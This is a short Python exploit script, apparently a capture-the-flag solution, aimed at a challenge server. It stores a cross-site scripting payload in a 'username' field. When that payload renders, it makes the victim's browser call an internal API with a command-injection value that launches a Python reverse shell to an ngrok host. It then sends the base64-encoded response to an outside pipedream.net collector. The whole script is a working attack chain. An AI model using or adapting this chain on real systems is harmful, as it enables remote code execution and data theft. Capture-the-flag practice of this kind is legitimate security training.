import urllib.parse

import requests
from utils.ctf.rev_shell import rev_shell

URL = "http://chal.competitivecyber.club:13337/"
payload = "; " + rev_shell("0.tcp.ngrok.io", 14139, "python")
print(payload)
uuid = requests.post(
	URL + "api/stats",
	json={
		"username": f"<script>fetch('http://127.0.0.1:1337/api/cal?modifier={urllib.parse.quote_plus(payload)}').then(x=>x.text()).then(x=>fetch('https://enugmh3f1kyk.x.pipedream.net/'+btoa(x)))</script>",
		"high_score": 1,
	},
).json()["id"]
print(URL + "api/stats/" + uuid)
